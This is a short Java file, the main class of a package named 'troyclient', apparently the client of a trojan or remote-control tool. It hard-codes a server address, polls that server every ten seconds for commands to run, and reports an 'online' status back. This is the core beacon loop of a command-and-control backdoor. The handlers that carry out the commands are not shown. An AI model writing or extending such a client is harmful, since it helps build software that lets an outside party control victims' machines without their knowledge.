package ch.lebois.troyclient;

import ch.lebois.troyclient.functions.CommandReciver;
import ch.lebois.troyclient.service.ConfigureInit;
import ch.lebois.troyclient.service.GetContext;

public class TroyClient {
    public static void main(String[] args) throws InterruptedException {

        ConfigureInit init = new ConfigureInit();
        init.configure("http://192.168.100.153:8080");

        CommandReciver commandReciver = new CommandReciver(init.getWebHandler());
        while (true) {
            Thread.sleep(10000);
            commandReciver.readCommands();
            GetContext.SENDER.send("online", "");

        }
    }
}
